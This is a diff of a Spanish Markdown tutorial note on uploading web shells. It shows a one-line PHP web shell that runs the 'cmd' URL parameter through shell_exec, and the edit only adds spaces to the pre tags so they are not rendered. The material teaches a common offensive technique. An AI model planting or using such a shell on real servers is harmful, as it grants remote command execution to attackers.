@@ -9,9 +9,13 @@ Hay momentos en los que nos encontramos con sitios web que nos dan la oportunida
 
 PHP sigue siendo el lenguaje de scripting más común del lado del servidor. Veamos un poco de código simple.
 
-`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`
+`<?php echo "< pre>" . shell_exec($_GET["cmd"]) . "< /pre>"; ?>`
 
-Esto, tomará el parámetro GET en la URL y lo ejecutará en el sistema con `shell_exec()`. Lo que significa que cualquier cosa que metamos en la URL después de `cmd=`, se ejecutará en el servidor. Los elementos `<pre>` son sólo para asegurarnos de que se formatea correctamente en en la página.
+Esto, tomará el parámetro GET en la URL y lo ejecutará en el sistema con `shell_exec()`. Lo que significa que cualquier cosa que metamos en la URL después de `cmd=`, se ejecutará en el servidor. Los elementos `< pre >` son sólo para asegurarnos de que se formatea correctamente en en la página.
+
+>[!CAUTION] Los elementos pre van sin espacios, están escritos así para no ser interpretados.
+>
+
 
 !**Pasted image 20251125130855.png**
 
